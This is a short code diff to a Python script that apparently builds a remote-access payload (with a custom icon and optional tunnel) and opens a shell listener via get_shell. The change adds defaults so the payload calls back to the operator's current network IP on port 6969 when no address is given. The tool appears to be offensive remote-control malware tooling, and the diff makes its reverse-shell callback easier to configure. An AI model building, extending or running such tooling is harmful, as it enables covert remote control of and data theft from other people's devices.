@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-
+from findmyip import*
 from utils import *
 import argparse
 import sys
@@ -51,12 +51,16 @@ if args.build:
         ip = socket.gethostbyname(domain)
         print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
         build(ip,port,args.output,True,port_,icon)
+    elif args.ip and args.port:
+            build(args.ip,port_,args.output,False,None,icon)            
+    elif args.ip==None and args.port:
+        build(MYIP, port_, args.output, False, None, icon)
+    elif args.ip==None and args.port==None:
+        build(MYIP, str(6969), args.output, False, None, icon)
+        print(stdOutput("using current network IP and on port: 6969"))
     else:
-        if args.ip and args.port:
-            build(args.ip,port_,args.output,False,None,icon)
-        else:
-            print(stdOutput("error")+"\033[1mArguments Missing")
-
+        print(stdOutput("error")+"\033[1mArguments Missing")
+        
 if args.shell:
     if args.ip and args.port:
         get_shell(args.ip,args.port) 
